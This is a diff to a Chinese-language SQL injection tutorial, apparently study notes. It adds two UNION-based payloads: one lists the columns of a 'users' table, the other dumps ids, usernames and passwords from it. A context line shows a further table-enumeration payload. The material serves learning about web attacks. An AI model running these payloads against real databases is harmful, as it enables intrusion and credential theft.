@@ -34,9 +34,13 @@ database()           #数据库名
 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
 ```
 6.**获取列名**
-
+```
+UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+
+```
 7.**获取字段**
-
+```
+UNION SELECT 1,2,group_concat(id,username,password) from users --+
+```
 8.**总结**
 ```
 order by –+ 判断字段数目
